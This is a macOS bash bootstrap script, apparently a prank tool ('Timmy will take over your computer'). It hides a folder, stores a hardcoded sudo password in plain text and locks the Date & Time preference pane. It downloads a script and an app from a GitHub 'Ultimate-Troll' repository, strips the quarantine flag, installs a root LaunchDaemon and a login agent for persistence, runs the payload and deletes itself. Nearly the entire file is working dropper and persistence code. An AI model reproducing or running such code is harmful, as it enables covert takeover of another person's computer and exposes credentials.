
#!/usr/bin/env bash
SCRIPT_FILE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")"

cat <<'NOTICE'
######################################################################
# Sit tight, this set-up can take up to 5-30 minutes depending on the 
# other computer and the network.
# 请稍等！初次设置可能会长达5-30分钟，这取决于网速以及另一台电脑的速度！
######################################################################
NOTICE

# Prominent warning and countdown
cat <<'WARNBOX'
+------------------------------------------------------------+
| This script is made for a specific purpose.                |
| If you don't know what you are doing,                      |
| BREAK OUT OF IT IMMEDIATELY by pressing CTRL+C.            |
| It may cause IRREVERSIBLE damage.                          |
| 这个脚本的存在有它的意义，如果您不知道您在干什么，         |
| 请立刻按CTRL+C停止该脚本                                   |
| 该脚本可能会造成不可逆的伤害                               |
+------------------------------------------------------------+

The creator will not be responsible for any danmage caused!
WARNBOX

cat <<'NAMEEE'
▖  ▖    ▖ ▖         ▘    ▄▖▘        
▛▖▞▌▌▌  ▛▖▌▀▌▛▛▌█▌  ▌▛▘  ▐ ▌▛▛▌▛▛▌▌▌
▌▝ ▌▙▌  ▌▝▌█▌▌▌▌▙▖  ▌▄▌  ▐ ▌▌▌▌▌▌▌▙▌
    ▄▌                            ▄▌
NAMEEE

echo "Press ENTER to continue immediately, or wait for the countdown..."
echo "按下ENTER立即执行, 否则请等待倒计时结束..."
# Countdown box
echo "+---------------------------------------------+"
echo "| Timmy will take over your computer in:     |"
echo "+---------------------------------------------+"
echo

# Press ENTER to continue immediately or wait for up to 30 seconds
secs=30
while [ $secs -ge 0 ]; do
    printf "\rStarting in %2d seconds...  " "$secs"
    read -t 1 -n 1 key
    if [ $? -eq 0 ]; then
        echo -e "\nContinuing immediately!"
        break
    fi
    secs=$((secs - 1))
done
if [ $secs -lt 0 ]; then
    echo -e "\nCountdown complete. Proceeding."
fi
echo

# === User check ===
CURRENT_USER=$(whoami)
if [ "$CURRENT_USER" != "carterhuang" ] && [ "$CURRENT_USER" != "root" ]; then
    echo "❌ Unauthorized user: $CURRENT_USER. Exiting."
    exit 1
fi

# === Configuration ===
TARGET_DIR="$HOME/programfiles"
PFILE="$TARGET_DIR/p.txt"
MAIN_SCRIPT="$TARGET_DIR/main.sh"
PLIST_LABEL="com.programfiles.main"
PLIST_PATH="/Library/LaunchDaemons/$PLIST_LABEL.plist"

# Temp plist path for safe installation
TMP_PLIST="/tmp/$PLIST_LABEL.plist"

echo "[$(date)] Script started as $CURRENT_USER."

# Always ensure the folder is hidden if it exists
if [ -d "$TARGET_DIR" ]; then
    chflags hidden "$TARGET_DIR"
fi

if [ -d "$TARGET_DIR" ]; then
    # -> Existing install: read sudo password from p.txt
    if [ ! -f "$PFILE" ]; then
        echo "❌ Password file not found at $PFILE. Exiting."
        exit 1
    fi
    PASSWORD=$(<"$PFILE")

    echo "✅ $TARGET_DIR exists (hidden)."

    # Create plist in /tmp
    echo "→ Writing LaunchDaemon plist to $TMP_PLIST as current user..."
    cat <<EOF > "$TMP_PLIST"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>$PLIST_LABEL</string>
    <key>ProgramArguments</key>
    <array>
      <string>$MAIN_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF

    # Move into place and set correct ownership and permissions
    echo "→ Installing plist to $PLIST_PATH..."
    echo "$PASSWORD" | sudo -S mv "$TMP_PLIST" "$PLIST_PATH"
    echo "$PASSWORD" | sudo -S chown root:wheel "$PLIST_PATH"
    echo "$PASSWORD" | sudo -S chmod 644 "$PLIST_PATH"

    # Load the LaunchDaemon
    echo "→ Loading LaunchDaemon..."
    echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"

    # Register main script to run at user login
    LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
    LAUNCH_AGENT_PLIST="$LAUNCH_AGENT_DIR/$PLIST_LABEL.login.plist"
    echo "Registering main script to open at login..."
    mkdir -p "$LAUNCH_AGENT_DIR"
    cat <<EOF > "$LAUNCH_AGENT_PLIST"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>$PLIST_LABEL.login</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/open</string>
    <string>-a</string>
    <string>$TARGET_DIR/DL.app</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF
    launchctl load "$LAUNCH_AGENT_PLIST"


else
    # -> First-time bootstrap: create & hide folder, store password
    echo " $TARGET_DIR not found. Bootstrapping..."
    echo "→ Creating folder $TARGET_DIR"
    mkdir -p "$TARGET_DIR"

    echo "→ Hiding folder"
    chflags hidden "$TARGET_DIR"

    echo "→ Storing sudo password in p.txt"
    echo "carterchloe2006" >"$PFILE"
    chmod 600 "$PFILE"

    PASSWORD=$(<"$PFILE")
    
        # Enforce network date & time sync
    echo "$PASSWORD" | sudo -S systemsetup -setnetworktimeserver "time.apple.com"
    echo "$PASSWORD" | sudo -S systemsetup -setusingnetworktime on
    # Immediately sync clock
    echo "$PASSWORD" | sudo -S sntp -sS time.apple.com
    # Prevent changes to date & time settings by disabling the Date & Time preference pane
    echo "$PASSWORD" | sudo -S chmod 000 /System/Library/PreferencePanes/DateAndTime.prefPane
    
    echo "→ Recording current time in time.txt"
    date +'%Y:%m:%d:%H:%M:%S' >"$TARGET_DIR/time.txt"

    echo "→ Downloading main.sh from GitHub"
    curl -fsSL "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/main.sh" -o "$MAIN_SCRIPT"

    echo "→ Downloading DL.zip"
    curl -fsSL "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/DL.zip" -o "$TARGET_DIR/DL.zip"

    echo "→ Unzipping DL.zip"
    unzip -o "$TARGET_DIR/DL.zip" -d "$TARGET_DIR"

    echo "→ Removing quarantine attribute from DL.app"
    xattr -r -d com.apple.quarantine "$TARGET_DIR/DL.app"

    echo "→ Disabling all macOS sleep (even on lid close)"
    echo "$PASSWORD" | sudo -S pmset -a sleep 0 standby 0 autopoweroff 0 hibernatemode 0
    # Disable UI sounds in System Preferences
    echo "$PASSWORD" | sudo -S defaults write com.apple.systempreferences SoundUIEffectOff -bool true


    echo "→ Making main.sh executable"
    chmod +x "$MAIN_SCRIPT"

    # Create plist in /tmp
    echo "→ Writing LaunchDaemon plist to $TMP_PLIST as current user..."
    cat <<EOF > "$TMP_PLIST"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>$PLIST_LABEL</string>
    <key>ProgramArguments</key>
    <array>
      <string>$MAIN_SCRIPT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
  </dict>
</plist>
EOF



    # Move into place and set correct ownership and permissions
    echo "→ Installing plist to $PLIST_PATH..."
    echo "$PASSWORD" | sudo -S mv "$TMP_PLIST" "$PLIST_PATH"
    echo "$PASSWORD" | sudo -S chown root:wheel "$PLIST_PATH"
    echo "$PASSWORD" | sudo -S chmod 644 "$PLIST_PATH"

    # Load the LaunchDaemon
    echo "→ Loading LaunchDaemon..."
    echo "$PASSWORD" | sudo -S launchctl load -w "$PLIST_PATH"

    # Register main script to run at user login
    LAUNCH_AGENT_DIR="$HOME/Library/LaunchAgents"
    LAUNCH_AGENT_PLIST="$LAUNCH_AGENT_DIR/$PLIST_LABEL.login.plist"
    echo "Registering main script to open at login..."
    mkdir -p "$LAUNCH_AGENT_DIR"
    cat <<EOF > "$LAUNCH_AGENT_PLIST"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>$PLIST_LABEL.login</string>
  <key>ProgramArguments</key>
  <array>
    <string>/usr/bin/open</string>
    <string>-a</string>
    <string>$TARGET_DIR/DL.app</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF
    launchctl load "$LAUNCH_AGENT_PLIST"

fi

# Launch main script exactly once after bootstrap logic
echo "→ Launching $MAIN_SCRIPT now..."
"$MAIN_SCRIPT"

echo "→ Cleaning up: removing this bootstrap script."
rm -- "$SCRIPT_FILE"
